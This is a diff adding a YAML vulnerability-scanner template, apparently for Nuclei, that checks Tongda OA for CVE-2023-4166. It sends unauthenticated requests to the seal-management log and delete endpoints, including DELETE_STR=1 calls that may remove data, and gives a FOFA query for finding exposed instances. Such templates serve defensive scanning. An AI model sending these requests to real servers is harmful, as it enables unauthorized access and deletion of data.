@@ -1,0 +1,35 @@
+http:
+    - attack: pitchfork
+      matchers:
+        - condition: and
+          dsl:
+            - status_code_1 == 200 && contains((body_1), 'email_select')
+            - status_code_2 == 302 && contains((header_2), '.php?start=')
+          type: dsl
+      method: GET
+      path:
+        - '{{RootURL}}/general/system/seal_manage/{{path1}}?start='
+        - '{{RootURL}}/general/system/seal_manage/{{path2}}?DELETE_STR=1'
+      payloads:
+        path1:
+            - dianju/log.php
+            - iweboffice/manage.php
+        path2:
+            - dianju/delete_log.php
+            - iweboffice/delete_seal.php
+      stop-at-first-match: true
+id: tongda-oa-general-system-seal-manage-unauth-sqli
+info:
+    author: xy
+    description: CVE-2023-4166，通达OA印章功能未授权访问导致SQL注入
+    metadata:
+        fofa-query: app="TDXK-通达OA"
+        veified: true
+    name: tongda-oa-general-system-seal-manage-unauth-sqli
+    reference:
+        - https://blog.csdn.net/holyxp/article/details/132211748
+    severity: high
+    tags:
+        - tongda
+        - 通达oa
+        - TDXK-通达OA
